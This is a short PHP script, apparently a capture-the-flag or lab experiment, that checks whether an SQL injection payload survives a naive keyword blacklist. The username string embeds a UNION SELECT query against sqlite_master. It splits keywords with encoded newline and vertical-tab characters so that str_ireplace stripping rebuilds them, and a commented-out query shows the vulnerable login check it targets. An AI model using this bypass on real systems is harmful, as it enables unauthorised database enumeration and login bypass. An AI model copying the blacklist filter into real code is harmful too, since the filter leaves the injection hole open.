<?php

	$username = 'admin\'%0AUN%0bION%0ASEL%0bECT%0Aname%0AFR%0bOM%0Asqlite_master%0AWHERE%0Atype=\'table\'%0b';

        $bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--'];
        $username = str_ireplace($bad, '', $username);
	$username = str_ireplace($bad, '', $username);

	echo $username;
	
	
// space: 0A 0D 0C 09 20
//        $row = (new SQLite3('/db.sqlite3'))
//               ->querySingle("SELECT * FROM users WHERE username = '$username' AND password = '$hash'", true);

?>
